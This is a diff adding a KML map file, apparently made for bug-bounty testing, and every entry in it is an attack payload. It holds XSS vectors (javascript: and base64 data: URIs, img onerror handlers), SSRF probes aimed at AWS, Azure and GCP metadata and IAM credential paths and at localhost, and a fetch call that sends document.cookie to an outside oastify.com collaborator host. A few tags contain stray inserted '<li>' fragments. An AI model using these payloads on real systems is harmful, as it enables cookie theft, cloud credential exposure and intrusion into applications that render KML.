@@ -1,0 +1,251 @@
+<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.opengis.net/kml/2.2 https://developers.google.com/kml/schema/kml22gx.xsd">
+  <Document>
+    <name>XSS + SSRF Test KML</name>
+    <description><![CDATA[Test KML for XSS and SSRF vulnerabilities]]></description>
+
+    <!-- ========================================== -->
+    <!-- 1. XSS en Icon href con javascript:       -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>XSS - javascript:alert(1)</name>
+      <description><![CDATA[Click the icon to trigger XSS]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>javascript:alert(1)</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.330653965921906,46.529863580494734</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 2. XSS en Icon href con data:             -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>XSS - data: URI</name>
+      <description><![CDATA[Data URI XSS payload]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.5,46.5</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 3. XSS en styleUrl                        -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>XSS -<li>  styleUrl</name>
+      <description><![CDATA[styleUrl with javascript:]]></description>
+      <styleUrl>javascript:alert(1)</styleUrl>
+      <Point>
+        <coordinates>8.6,46.4</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 4. XSS en Link href (NetworkLink)         -->
+    <!-- ========================================== -->
+    <NetworkLink>
+      <name>XSS - NetworkLink</name>
+      <description><![CDATA[NetworkLink with javascript:]]></description>
+      <Link>
+        <href>javascript:alert(1)</href>
+      </Link>
+    </NetworkLink>
+
+    <!-- ========================================== -->
+    <!-- 5. XSS en BalloonStyle text               -->
+    <!-- ========================================== -->
+    <Style id="balloonXSS">
+      <BalloonStyle>
+        <text><![CDATA[bugbounty]]></text>
+      </BalloonStyle>
+    </Style>
+    <Placemark>
+      <name>XSS - BalloonStyle</name>
+      <description><![CDATA[BalloonStyle<li> with img onerror]]></description>
+      <styleUrl>#balloonXSS<li></styleUrl>
+      <Point>
+        <coordinates>8.7,46.3</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 6. SSRF a AWS IMDSv1                      -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - AWS Metadata</name>
+      <description><![CDATA[Attempts to read AWS IMDSv1]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>http://qiczx0y44bhrhp5l487z0rwwyn4esagz.oastify.com/latest/meta-data/</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.8,46.2</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 7. SSRF a AWS IAM Credentials             -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - AWS IAM</name>
+      <description><![CDATA[Attempts to read AWS IAM credentials]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>http://qiczx0y44bhrhp5l487z0rwwyn4esagz.oastify.com/latest/meta-data/iam/security-credentials/</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.9,46.1</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 8. SSRF a Azure Metadata                  -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - Azure Metadata</name>
+      <description><![CDATA[Attempts to read Azure IMDS]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>http://qiczx0y44bhrhp5l487z0rwwyn4esagz.oastify.com/metadata/instance?api-version=2017-08-01</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>9.0,46.0</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 9. SSRF a GCP Metadata                    -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - GCP Metadata</name>
+      <description><![CDATA[Attempts to read GCP metadata]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>http://metadata.google.internal/computeMetadata/v1/</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>9.1,45.9</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 10. SSRF a localhost                      -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - localhost</name>
+      <description><![CDATA[<h1><li>Bugbounty]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>http://qiczx0y44bhrhp5l487z0rwwyn4esagz.oastify.com/</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>9.2,45.8</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 11. SSRF a internal service               -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - Internal Service</name>
+      <description><![CDATA[Attempts to read internal service]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>http://127.0.0.1:8080/</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>9.3,45.7</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 12. Exfiltración a Collaborator           -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>Exfiltration Test</name>
+      <description><![CDATA[Attempts to exfiltrate data to collaborator]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>https://q6xzl0m4sb5r5ptls8vzorkwmnseg84x.oastify.com/steal?data=test</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>9.4,45.6</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 13. Redirección a sitio malicioso         -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name><![CDATA[<img src=x onerror=alert(1)>]]></name>
+      <description><![CDATA["><li><img src=x onerror=alert(1)>]]></description>
+      <Point>
+        <coordinates>9.5,45.5</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 14. XSS en description (si se renderiza)  -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>XSS - Description</name>
+      <description><![CDATA[<img src=x onerror=alert(1)>]]></description>
+      <Point>
+        <coordinates>9.6,45.4</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 15. Exfiltración de cookies (si hay JS)   -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name><![CDATA[<img src=x onerror="fetch('https://q6xzl0m4sb5r5ptls8vzorkwmnseg84x.oastify.com/steal?c='+document.cookie)">]]></name>
+      <description><![CDATA[Exfiltration of cookies]]></description>
+      <Point>
+        <coordinates>9.7,45.3</coordinates>
+      </Point>
+    </Placemark>
+
+  </Document>
+</kml>
